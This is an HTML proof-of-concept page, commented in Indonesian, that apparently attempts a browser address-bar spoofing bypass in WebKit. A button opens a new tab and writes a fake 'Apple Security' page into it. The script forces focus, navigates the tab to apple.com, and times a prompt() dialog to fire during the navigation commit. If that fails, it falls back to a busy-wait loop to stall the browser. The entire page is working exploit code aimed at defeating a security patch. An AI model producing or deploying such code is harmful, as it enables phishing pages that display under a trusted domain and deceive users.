<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Advanced Bypass Verification</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fafafa;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
      }
      button {
        padding: 22px 44px;
        font-size: 22px;
        font-weight: bold;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 14px;
        cursor: pointer;
        box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="startBtn">EXECUTE BYPASS TEST</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membuka jendela baru
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          // Menyuntikkan DOM konten penyerang
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <div>
                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Apple Security</h1>
                <p style="font-size:20px;color:#86868b;margin:0;">Establishing secure tunnel...</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // 2. Memaksa fokus berpindah secara eksplisit ke tab baru agar WebState menjadi VISIBLE/PRIMARY 
          // (Ini mengelabui patch agar mengira tab sudah aktif sepenuhnya)
          try {
            newTab.focus();
          } catch (e) {}

          // 3. Memicu navigasi asinkron ke domain target (apple.com)
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {
              console.error(err);
            }
          }, 30);

          // 4. Mengeksekusi dialog modal tepat saat transisi visibilitas dan commit navigasi beririsan
          setTimeout(() => {
            try {
              // Jika prompt() diblokir oleh patch, kita paksa masuk dengan manipulasi event tambahan
              newTab.eval('prompt("BYPASS_VISIBILITY_CHECK");');
            } catch (e) {
              // Fallback berat jika dialog ditolak total: Mengunci main thread dengan teknik synchronous blocking terdistribusi
              const end = Date.now() + 2000;
              while (Date.now() < end) {
                // Intensive busy-wait untuk melumpuhkan event loop WebKit sebelum state commit selesai
              }
            }
          }, 180);
        }
      };
    </script>
  </body>
</html>
